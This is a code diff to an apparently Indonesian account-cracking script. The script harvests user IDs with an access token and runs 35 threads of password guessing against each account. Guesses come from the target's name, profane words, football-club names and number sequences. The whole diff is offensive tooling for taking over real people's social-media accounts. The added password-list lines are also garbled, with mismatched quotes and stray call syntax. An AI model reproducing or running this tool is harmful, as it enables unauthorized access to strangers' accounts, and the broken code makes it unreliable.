@@ -473,8 +473,7 @@ def dump(token,nama,ttl):
 	pi=input(f"[{biru}?{putih}] CHOSEE\t: ")
 	print("")
 	print(f" *** Password sudah tersedia nama_depan123 - 12345 & nama lengkap. Jika ingin menambahkan password silahkan isi dibawah!")
-	print(f" *** Contoh bangsat,bangsat123,bangsat12345,bangsatlu,anjing,anjing123,anjing12345,babi,babi123,babi12345,,kontol,kontol123,kontol12345,memek,memek123,memek12345,jembut,jembut123,jembut12345,jancok,jancok123,jancok12345,anjay,anjay123,anjay12345,ganteng,ganteng123,ganteng12345,akuganteng,guaganteng,sayaganteng,cantik,cantik123,cantik12345,akucantik,sayacantik,guacantik,sayang,sayang123,sayang12345,akusayangkamu,sayangkamu,cinta,cinta123,cinta12345,akucintakamu,cintakamu,rahasia,rahasia123,rahasia12345,rahasiabanget,lupasandi,masukansandi,bebas,bebas123,bebas12345,terserah,mancung,pesek,akumancung,akupesek
-akuimut,persib1933,persija1928,apaya,indonesia12345,rahasia,doraemon masukan {biru}'t'{putih} untuk tidak menambahkan password\n")
+	print(f" *** Contoh sayang,bismillah,anjing masukan {biru}'t'{putih} untuk tidak menambahkan password\n")
 	if(pi in ("01","1")):
 		with Bool(max_workers=35) as kirim:
 			pas=input(f"[{ijo}+{putih}] Masukan password tambahan\t: ").replace(" ","").split(",")
@@ -562,9 +561,9 @@ akuimut,persib1933,persija1928,apaya,indonesia12345,rahasia,doraemon masukan {bi
 					continue
 				else:
 					if(len(str(name.lower()))>=6):
-						password=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap]
+						password=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap',bangsat123',bangsat1234',bangsat12345',bangsat',kontol',kontol123',kontol1234',kontol12345',memek',memek123',memek12345',memek1234',jembut',jembut123',jembut1234',jembut12345',anjing',anjing123',anjing1234',anjing12345',katasandi',bebas123',apaya',cantik',akucantik',ganteng',akuganteng',pesek',pesek123',mancung',mancung123',indonesia',indonesia1945',rahasia',jangankepo',sayang',sayangku',sayangkamu()+'name',masukansandi',doraemon',upinipin',123456789',12345678',1234567',123456',bebasdeh',persib1933',persija1928',persibaya1927',viking',thejak',bonek',bandung',jakarta',surabaya',indonesiaku]
 					else:
-						password=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap]
+						password=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap',bangsat123',bangsat1234',bangsat12345',bangsat',kontol',kontol123',kontol1234',kontol12345',memek',memek123',memek12345',memek1234',jembut',jembut123',jembut1234',jembut12345',anjing',anjing123',anjing1234',anjing12345',katasandi',bebas123',apaya',cantik',akucantik',ganteng',akuganteng',pesek',pesek123',mancung',mancung123',indonesia',indonesia1945',rahasia',jangankepo',sayang',sayangku',sayangkamu()+'name',masukansandi',doraemon',upinipin',123456789',12345678',1234567',123456',bebasdeh',persib1933',persija1928',persibaya1927',viking',thejak',bonek',bandung',jakarta',surabaya',indonesiaku]
 					if(pas in ('t','T')):
 						kirim.submit(kondisi(token).kondisi_mbasic2,uid,password)
 					else:
